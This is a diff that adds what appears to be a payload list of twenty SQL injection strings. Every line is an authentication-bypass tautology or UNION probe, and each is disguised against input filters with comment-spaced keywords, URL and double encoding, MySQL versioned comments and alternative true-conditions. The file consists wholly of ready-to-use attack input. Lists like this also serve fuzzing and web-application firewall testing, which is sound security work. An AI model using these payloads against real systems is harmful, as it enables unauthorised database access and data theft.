@@ -1,0 +1,20 @@
+'/**/OR/**/1/**/=/**/1--
+'%09OR%091=1--
+'/*!50000OR*/1=1--
+'||1=1--
+' OR%0a1=1--
+' OR 1 LIKE 1--
+' OR 1 REGEXP 1--
+' OR 1 BETWEEN 0 AND 2--
+' OR GREATEST(1,0)=1--
+' OR ELT(1,1)=1--
+' UN/**/ION SEL/**/ECT 1,2--
+' /*!UNION*/ /*!SELECT*/ 1,2--
+'+OR+1=1--
+'%2527OR%25271%3D1--
+' OR COALESCE(NULL,1)=1--
+' AND CASE WHEN (1=1) THEN 1 ELSE 0 END=1--
+' OR 2 IN (1,2)--
+'||(SELECT 1 FROM dual WHERE 1=1)||'
+' OR (SELECT 1 FROM (SELECT 1)a)=1--
+' OR ASCII(1)=49--
